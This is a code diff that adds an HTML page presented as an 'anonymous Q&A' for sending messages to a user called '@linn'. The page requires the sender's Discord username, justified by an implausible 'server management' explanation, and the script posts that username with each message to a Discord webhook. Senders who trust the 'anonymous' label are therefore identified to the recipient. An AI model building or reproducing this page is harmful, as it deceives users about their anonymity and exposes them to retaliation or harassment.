@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ask Questions - Anonymous Q&A</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #ff69b4, #ff4500);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .bubble {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .bubble::before {
+            content: "";
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-bottom: 10px solid rgba(255, 255, 255, 0.9);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .user-info img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+
+        .user-info span {
+            font-weight: bold;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            border: none;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 16px;
+            resize: none;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .anonymous-label {
+            font-size: 14px;
+            color: #fff;
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 5px 10px;
+            border-radius: 20px;
+        }
+
+        .send-button {
+            background-color: #000;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .discord-input {
+            margin-top: 20px;
+        }
+
+        .discord-input label {
+            display: block;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+
+        .discord-input input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+        }
+
+        .explanation {
+            color: #fff;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        #response-message {
+            color: #fff;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bubble">
+            <div class="user-info">
+                <!-- Replace with your own avatar URL or use a placeholder -->
+                <img src="https://via.placeholder.com/40" alt="User Avatar">
+                <span>@linn</span> send anonymous message to linn
+            </div>
+            <textarea id="message" placeholder="send a anonymous message"></textarea>
+        </div>
+        <div class="discord-input">
+            <label for="discord-username">Discord Username (required for server management)</label>
+            <input type="text" id="discord-username" placeholder="Your Discord username" required>
+            <label for="profile-pic-url">Discord Profile Picture URL (optional for server management)</label>
+            <input type="text" id="profile-pic-url" placeholder="https://cdn.discordapp.com/avatars/...">
+        </div>
+        <p class="explanation">The Discord username and profile picture are used for server management so that if the server goes down, you can cool the server by kicking people if needed. Profile picture is optional.</p>
+        <div class="footer">
+            <span class="anonymous-label">🔒 anonymous q&a</span>
+            <button class="send-button" onclick="sendMessage()">Send!</button>
+        </div>
+        <div id="response-message"></div>
+    </div>
+
+    <script>
+        function sendMessage() {
+            const message = document.getElementById('message').value;
+            const discordUsername = document.getElementById('discord-username').value;
+            const profilePicUrl = document.getElementById('profile-pic-url').value || '';
+            const responseMessage = document.getElementById('response-message');
+
+            if (!message) {
+                responseMessage.textContent = 'Please enter a message.';
+                return;
+            }
+
+            if (!discordUsername) {
+                responseMessage.textContent = 'Please enter your Discord username.';
+                return;
+            }
+
+            // Replace with your actual Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+
+            const embed = {
+                author: {
+                    name: discordUsername
+                },
+                description: message
+            };
+
+            if (profilePicUrl) {
+                embed.author.icon_url = profilePicUrl;
+            }
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    responseMessage.textContent = 'Message sent successfully!';
+                    document.getElementById('message').value = '';
+                    document.getElementById('discord-username').value = '';
+                    document.getElementById('profile-pic-url').value = '';
+                } else {
+                    responseMessage.textContent = 'Failed to send message.';
+                }
+            })
+            .catch(error => {
+                responseMessage.textContent = 'Error: ' + error.message;
+            });
+        }
+    </script>
+</body>
+</html>
